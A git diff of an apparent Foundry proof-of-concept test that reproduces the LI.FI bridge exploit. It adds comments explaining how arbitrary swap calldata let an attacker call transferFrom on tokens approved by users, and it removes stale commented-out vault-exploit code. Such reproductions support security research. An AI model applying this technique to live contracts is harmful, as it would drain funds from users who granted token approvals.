@@ -46,6 +46,13 @@ contract ContractTest is DSTest {
 
     function testExploit() public {
         cheats.startPrank(from); 
+
+        // The Vulnerability
+        // The hack took advantage of our pre-bridge swap feature. Our smart contract allows a caller to pass an array of multiple swaps using any address with arbitrary calldata.
+
+        // This design gave us maximum flexibility in what DEXs we could call and what methods we could call. This also allowed anyone to call other contracts, not just DEXs. Our contract checks to make sure that the result of the swap or swaps is enough tokens to continue the bridging operation.
+
+        // The attacker started by passing a legitimate swap of a small amount followed by multiple calls directly to various token contracts. Specifically, they called the `transferFrom` method which allowed the attacker to transfer funds from users’ wallets that had previously given infinite approval to our contract for that specific token.
         ILIFI.LiFiData memory _lifiData = ILIFI.LiFiData({
             transactionId: 0x1438ff9dd1cf9c70002c3b3cbec9c4c1b3f9eb02e29bcac90289ab3ba360e605,
             integrator: "li.finance",
@@ -392,15 +399,5 @@ contract ContractTest is DSTest {
         });
         
         ILIFI(lifi).swapAndStartBridgeTokensViaCBridge(_lifiData, _swapData, _cBridgeData);
-    //     emit log_named_uint("Before exploit, USDC  balance of attacker:", usdc.balanceOf(msg.sender));
-    //  pair.swap(80000000*1e6,0,address(this),new bytes(1));
-    //     emit log_named_uint("After exploit, USDC  balance of attacker:", usdc.balanceOf(msg.sender));
     }
-    // function hook(address sender, uint amount0, uint amount1, bytes calldata data) external{
-    //     usdc.approve(address(vault),type(uint256).max);
-    //     vault.depositSafe(amount0,address(usdc),1);
-    //     vault.withdraw(vault.balanceOf(address(this)),address(usdc));
-    //     usdc.transfer(msg.sender,(amount0/9999*10000)+10000);
-    //     usdc.transfer(tx.origin,usdc.balanceOf(address(this)));
-    // }
 }
